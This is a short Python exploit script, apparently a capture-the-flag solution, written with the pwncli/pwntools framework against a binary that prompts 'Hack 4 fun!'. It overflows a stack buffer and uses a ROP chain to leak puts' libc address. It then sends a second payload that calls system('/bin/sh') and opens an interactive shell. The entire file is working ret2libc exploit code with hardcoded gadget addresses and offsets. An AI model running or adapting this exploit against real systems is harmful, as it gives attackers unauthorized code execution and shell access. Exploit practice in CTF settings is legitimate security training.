from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc:ELF = gift['libc']

payload = flat([b"a"*(0x110 - 4), p32(0x10d), 0, 0x0000000000400843, elf.got['puts'], elf.plt['puts'], 0x400790])

p.sendlineafter("Hack 4 fun!\n", payload)

msg = p.recvline()
libc_base_addr = u64(msg[:-1].ljust(8, b"\x00")) - libc.sym['puts']
log_address("libc_base_addr", libc_base_addr)

libc.address = libc_base_addr

# sleep(1)
payload = flat([b"b"*(0x110 - 4), p32(0x10d), 0xdeadbeef, 0x400843, libc.search(b"/bin/sh").__next__(), libc.sym['system']])
p.sendlineafter("Hack 4 fun!\n", payload)


p.interactive()